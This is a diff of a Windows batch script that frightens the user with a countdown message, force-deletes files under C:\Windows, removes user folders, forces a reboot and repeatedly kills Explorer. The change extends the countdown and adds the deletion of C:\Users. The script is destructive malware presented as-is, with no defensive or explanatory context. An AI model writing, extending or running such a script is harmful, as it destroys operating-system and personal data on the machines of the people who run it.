@@ -1,7 +1,8 @@
 @echo off
-start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 10 SECONDS!&echo(&pause"
-del /s /f /q C:\Windows*.*
-shutdown -r /o -t 10
+start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
+del /F /s /q C:\Windows*.*
+rmdir C:\Users*.*
+shutdown -r /o -t 30
 taskkill /im explorer.exe /f
 start explorer.exe
 taskkill /im explorer.exe /f
